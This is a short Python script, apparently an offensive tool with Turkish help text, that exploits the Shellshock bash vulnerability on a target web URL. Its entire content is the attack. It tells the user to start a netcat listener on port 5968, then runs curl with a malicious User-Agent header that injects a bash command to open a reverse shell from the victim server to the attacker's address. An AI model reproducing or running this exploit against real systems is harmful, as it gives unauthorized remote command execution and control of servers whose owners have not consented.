# -*- coding:utf-8 -*-

import os
from colorama import Fore
import argparse


banner = Fore.RESET + """
\033[1m ____  _          _ _     _                _    
\033[1m/ ___|| |__   ___| | |___| |__   ___   ___| | __""" + Fore.CYAN +  """
\033[1m\___ \| '_ \ / _ \ | / __| '_ \ / _ \ / __| |/ /""" + Fore.RED +  """
\033[1m ___) | | | |  __/ | \__ \ | | | (_) | (__|   < """ + Fore.YELLOW + """
\033[1m|____/|_| |_|\___|_|_|___/_| |_|\___/ \___|_|\_\\""" + Fore.RESET + """ """

print(banner)
print()
ayr = argparse.ArgumentParser(description='ShellsHock Exploitation')

ayr=argparse.ArgumentParser(prog='python3 shellshock.py')
ayr=argparse.ArgumentParser(epilog='Not:  Uygulamayı Çalıştırmadan Önce Başka Bir Terminalde "nc -nlvp 5968" Komutunu Çalıştırın')
url1 = ayr.add_argument('-u','--url', nargs='+', required=True,metavar='', help='Hedef URL', type=str)
ip1 = ayr.add_argument('-l','--lhost', nargs='+', required=True,metavar='',help='Bağlantının Gideceği Adres', type=str)
arg = ayr.parse_args()
url = arg.url[0]
ip = arg.lhost[0]

if arg == ayr.parse_args():
	os.system("clear")
	print(banner)
	print("\n\n\nDiğer Terminale Bakınız\n")
	os.system("""curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/"""+ ip + """/5968 0>&1' """ + url)
